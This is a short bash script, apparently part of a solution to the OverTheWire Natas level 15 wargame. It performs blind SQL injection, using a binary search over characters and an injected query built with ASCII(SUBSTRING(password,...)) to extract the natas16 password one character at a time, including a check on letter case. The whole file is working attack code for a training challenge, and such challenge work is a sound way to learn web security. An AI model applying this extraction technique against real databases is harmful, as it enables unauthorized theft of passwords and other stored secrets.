#!/bin/bash

set="0123456789abcdefghijklmnopqrstuvwxyz"
final=""
a=0
b=35
while [[ $a != $b ]]; do
	((i = (a+b+1)/2))
	ch=${set:$i:1}
	result=$( bash injlt.sh $1$ch )
	if [[ $result = "true" ]]; then
		((b = i - 1 ))
	else
		((a = i))
	fi
done
ch=${set:$a:1}
if (( $a >= 10 )); then
	(( start = ${#1} + 1 ))
	query="natas16\" and ASCII(SUBSTRING(password,$start,1)) = ASCII(\"$ch\") or username = \"natas15"
	result=$( bash testinj.sh "$query" )
	if [[ $result = "false" ]]; then
		((newindex = $a - 10 ))
		upper="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		ch=${upper:$newindex:1}
	fi
fi
echo $ch
